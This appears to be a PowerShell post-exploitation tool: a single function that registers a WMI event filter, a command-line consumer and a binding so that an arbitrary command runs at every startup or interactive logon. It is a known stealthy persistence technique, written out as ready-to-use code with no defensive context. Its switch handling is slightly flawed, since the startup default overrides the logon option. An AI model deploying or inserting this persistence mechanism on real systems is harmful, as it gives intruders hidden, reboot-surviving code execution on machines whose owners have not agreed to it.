function New-WMIPersistence {
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Name,

        [Parameter(Mandatory=$True)]
        [string]$Command,

        [Parameter()]
        [string]$Arguments,

        [switch]$OnStartup=$True,

        [switch]$OnLogon=$False
    )

    if ($OnLogon) {
        $query = "Select * from __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' and TargetInstance.LogonType = 2"
    }

    if ($OnStartup) {
        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
    }

    $filterArgs = @{
        Name=$Name;
        EventNameSpace="root\cimv2";
        QueryLanguage="WQL";
        Query=$query
    }
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $filterArgs
    
    $consumerArgs = @{
        Name="$Name-Consumer";
        ExecutablePath= $Command;
        CommandLineTemplate ="$Command $Arguments"
    }
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $consumerArgs
    
    $instanceArgs = @{
        Filter=$WMIEventFilter;
        Consumer=$WMIEventConsumer
    }

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $instanceArgs
}